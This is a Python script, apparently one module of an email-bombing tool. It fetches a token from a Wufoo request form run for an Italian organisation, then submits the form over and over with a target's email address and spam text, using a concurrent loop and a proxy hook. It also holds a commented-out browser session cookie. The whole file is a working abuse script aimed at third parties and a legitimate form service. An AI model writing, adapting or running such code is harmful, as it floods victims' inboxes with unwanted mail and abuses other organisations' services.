import re
from os.path import basename

import requests

from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'wonderpaws.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    response = session.get(
        'https://digitcremona.wufoo.com/forms/s1bjm4bg1hk1c80/',
        headers=headers
    )
    return response


def post(session: requests.Session, id_stamp, text, target):
    headers = {
        'authority': 'digitcremona.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary6tc588SbERh5goJd',
        # 'cookie': 'ep201=/nt2Fy8JU1w8AV76lRO/PBrqza0=; PHPSESSID=d2e6svcd4ua4mubr1noqjcie0stv2bnu; _splunk_rum_sid=%7B%22id%22%3A%22c284eb377ebc9a398ec0652d47c20327%22%2C%22startTime%22%3A1678180424141%7D; submission-apusa-133=submitted; submission-tfah-234=submitted; submission-wiscorps-28=submitted; submission-digitcremona-53=submitted; wuentry=e-1007-e-87454; submission-ieom-29=submitted; _gcl_au=1.1.218473810.1678180663; _uetsid=ea97df50bcc811eda6cd9f59d68d0f19; _uetvid=cf777bd0ac7411edaa97494ab2e8e1e5; _fbp=fb.1.1678180663416.641640154; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Mar+07+2023+11%3A17%3A43+GMT%2B0200+(%D0%92%D0%BE%D1%81%D1%82%D0%BE%D1%87%D0%BD%D0%B0%D1%8F+%D0%95%D0%B2%D1%80%D0%BE%D0%BF%D0%B0%2C+%D1%81%D1%82%D0%B0%D0%BD%D0%B4%D0%B0%D1%80%D1%82%D0%BD%D0%BE%D0%B5+%D0%B2%D1%80%D0%B5%D0%BC%D1%8F)&version=202302.1.0&isIABGlobal=false&hosts=&consentId=7e38540a-8d3b-4263-81f0-78adeef22d95&interactionCount=1&landingPath=https%3A%2F%2Fwww.wufoo.com%2Fendpage%2F&groups=C0001%3A1%2CC0003%3A0%2CC0004%3A0; endpage=%7B%22Username%22%3A%22d6400%22%2C%22FormHash%22%3A%22m19bftgj1lospxk%22%7D; submission-d6400-2=submitted',
        'origin': 'https://digitcremona.wufoo.com',
        'pragma': 'no-cache',
        'referer': 'https://digitcremona.wufoo.com/forms/s1bjm4bg1hk1c80/',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    data = '------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field1"\r\n\r\ntest\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field2"\r\n\r\ntest\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field124"\r\n\r\ntest\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field8"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field128"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field130"\r\n\r\ntest\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field562"\r\n\r\nALTRO\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field455-1"\r\n\r\n12\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field455-2"\r\n\r\n12\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field455"\r\n\r\n1212\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field461"\r\n\r\nSEMPLICE COPIA ATTO/DOCUMENTO\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field144"\r\n\r\nSI UTENTE GIA\' REGISTRATO\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field145"\r\n\r\nNO\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field661"\r\n\r\ntest\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field132"\r\n\r\ntest\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field136"\r\n\r\ntest\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field353"\r\n\r\nURGENTE PER IMPUGNAZIONE\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="Field134"; filename="test.jpg"\r\nContent-Type: application/octet-stream\r\n\r\nawdawd\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\nlSC0nYciXUjv4b7m0Bgymh4mwuBewTIAULfRywuBeEukmB5Y0=\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nInvia\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":0,"startTime":4062,"endTime":25105,"referer":null}\r\n------WebKitFormBoundary6tc588SbERh5goJd\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundary6tc588SbERh5goJd--\r\n'

    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target)

    response = session.post(
        headers['referer'],
        headers=headers,
        data=data.encode(),
    )
    return response


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        # s.proxies = self.get_proxies()
        get_resp = get(s)
        pattern = re.compile('(?<=name="idstamp" value=").*(?=" >)')
        idstamp = pattern.findall(get_resp.text)
        if not idstamp:
            return
        text = self.get_text()
        post_resp = post(s, idstamp[0], text, target)
        return post_resp


def main():
    s = 'GRAZIE'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
